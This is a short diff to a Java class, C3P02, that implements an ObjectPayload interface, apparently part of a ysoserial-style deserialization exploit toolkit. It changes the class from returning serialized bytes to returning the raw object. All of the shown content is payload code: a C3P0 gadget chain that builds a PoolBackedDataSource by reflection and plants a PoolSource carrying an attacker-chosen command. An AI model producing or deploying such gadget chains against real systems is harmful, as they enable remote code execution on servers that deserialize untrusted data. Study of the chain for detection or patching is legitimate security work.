@@ -24,23 +24,11 @@ import java.util.logging.Logger;
  */
 public class C3P02 implements ObjectPayload<Object>{
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         String               command = param[0];
         PoolBackedDataSource b       = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(command));
-
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(b);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return b;
     }
 
 
